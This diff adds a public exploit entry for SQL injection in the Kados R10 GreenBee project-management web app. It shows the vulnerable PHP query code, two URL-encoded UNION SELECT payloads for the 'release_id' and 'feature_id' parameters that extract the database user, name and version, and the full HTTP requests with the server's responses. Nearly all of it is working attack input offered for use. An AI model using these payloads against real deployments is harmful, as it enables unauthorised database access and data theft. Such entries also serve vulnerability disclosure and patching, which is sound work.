@@ -1,0 +1,74 @@
+# Exploit Title: Kados R10 GreenBee - 'release_id' SQL Injection
+# Dork: N/A
+# Date: 2018-10-15
+# Exploit Author: Ihsan Sencan
+# Vendor Homepage: https://www.kados.info/
+# Software Link: https://sourceforge.net/projects/kados/
+# Version: R10 GreenBee
+# Category: Webapps
+# Tested on: WiN7_x64/KaLiLinuX_x64
+# CVE: N/A
+# Description
+# All users can run sql injection codes.
+
+# POC: 
+# 1)
+# /[PATH]/boards_buttons/update_release.php
+# $request=new sqlRequest("SELECT * FROM kados_releases WHERE release_id=".$_REQUEST['release_id'],$cnx->num);
+# $releaseData=$request->getObject();
+# $request->sqlGet('SELECT * FROM kados_activities WHERE activity_release_id_fk='.$_REQUEST['release_id']);
+# $request->countRows();
+# $useChecklist=$request->rowCount;
+# http://localhost/[PATH]/boards_buttons/update_release.php?release_id=[SQL]
+
+%2d%31%20%20%55%4e%49%4f%4e%20%53%45%4c%45%43%54%20%31%2c%43%4f%4e%43%41%54%5f%57%53%28%30%78%32%30%33%61%32%30%2c%55%53%45%52%28%29%2c%44%41%54%41%42%41%53%45%28%29%2c%56%45%52%53%49%4f%4e%28%29%29%2c%33%2c%34%2c%35%2c%36%2c%37%2c%38%2c%39%2d%2d%20%2d
+
+GET /[PATH]/boards_buttons/update_release.php?release_id=%2d%31%20%20%55%4e%49%4f%4e%20%53%45%4c%45%43%54%20%31%2c%43%4f%4e%43%41%54%5f%57%53%28%30%78%32%30%33%61%32%30%2c%55%53%45%52%28%29%2c%44%41%54%41%42%41%53%45%28%29%2c%56%45%52%53%49%4f%4e%28%29%29%2c%33%2c%34%2c%35%2c%36%2c%37%2c%38%2c%39%2d%2d%20%2d HTTP/1.1
+Host: TARGET
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Cookie: PHPSESSID=qkb8rjor2kudi2vp2tuf9q3ot7
+Connection: keep-alive
+HTTP/1.1 200 OK
+Date: Mon, 15 Oct 2018 12:44:09 GMT
+Server: Apache/2.4.25 (Win32) OpenSSL/1.0.2j PHP/5.6.30
+X-Powered-By: PHP/5.6.30
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+Pragma: no-cache
+Content-Length: 1888
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Content-Type: text/html; charset=UTF-8
+
+# POC: 
+# 2)
+# /[PATH]/boards_buttons/update_feature.php
+# $request=new sqlRequest("SELECT * FROM kados_features WHERE feature_id=".$_REQUEST['feature_id'],$cnx->num);
+# $featureData=$request->getObject();
+# http://localhost/[PATH]/boards_buttons/update_feature.php?feature_id=[SQL]
+
+%2d%31%20%20%55%4e%49%4f%4e%28%53%45%4c%45%43%54%28%31%29%2c%28%32%29%2c%28%33%29%2c%43%4f%4e%43%41%54%5f%57%53%28%30%78%32%30%33%61%32%30%2c%55%53%45%52%28%29%2c%44%41%54%41%42%41%53%45%28%29%2c%56%45%52%53%49%4f%4e%28%29%29%2c%28%35%29%29%2d%2d%20%2d
+ 
+GET /[PATH]/boards_buttons/update_feature.php?feature_id=%2d%31%20%20%55%4e%49%4f%4e%28%53%45%4c%45%43%54%28%31%29%2c%28%32%29%2c%28%33%29%2c%43%4f%4e%43%41%54%5f%57%53%28%30%78%32%30%33%61%32%30%2c%55%53%45%52%28%29%2c%44%41%54%41%42%41%53%45%28%29%2c%56%45%52%53%49%4f%4e%28%29%29%2c%28%35%29%29%2d%2d%20%2d HTTP/1.1
+Host: TARGET
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Cookie: PHPSESSID=qkb8rjor2kudi2vp2tuf9q3ot7
+Connection: keep-alive
+HTTP/1.1 200 OK
+Date: Mon, 15 Oct 2018 12:50:19 GMT
+Server: Apache/2.4.25 (Win32) OpenSSL/1.0.2j PHP/5.6.30
+X-Powered-By: PHP/5.6.30
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+Pragma: no-cache
+Content-Length: 1436
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Content-Type: text/html; charset=UTF-8
+#More than 40 files are vulnerable. Etc....
